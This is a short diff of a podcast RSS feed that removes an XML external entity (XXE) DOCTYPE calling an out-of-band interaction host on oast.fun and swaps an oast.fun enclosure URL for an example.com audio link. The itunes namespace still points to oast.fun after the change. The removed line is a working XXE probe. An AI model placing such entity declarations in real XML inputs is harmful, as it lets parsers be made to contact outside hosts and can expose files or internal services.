@@ -1,5 +1,4 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://xhuufwclefcwvjowkdqkksx4xk573foyv.oast.fun/XXETEST"> %xxe; ]>
 <rss version="2.0"
     xmlns:itunes="http://kfccmxdmjjerknakqcxjco7fw0myp7kyj.oast.fun/dtds/podcast-1.0.dtd">
   <channel>
@@ -16,7 +15,7 @@
       <title>Top 10 myths about caring for a zebra</title>
       <description>Here are the top 10 misunderstandings about the care, feeding, and breeding of these lovable striped animals.</description>
       <pubDate>Tue, 14 Mar 2017 12:00:00 GMT</pubDate>
-      <enclosure url="http://xhuufwclefcwvjowkdqkksx4xk573foyv.oast.fun/mp3"
+      <enclosure url="https://www.example.com/podcasts/dafnas-zebras/audio/toptenmyths.mp3"
                  type="audio/mpeg" length="34216300"/>
       <itunes:duration>30:00</itunes:duration>
       <guid isPermaLink="false">dzpodtop10</guid>
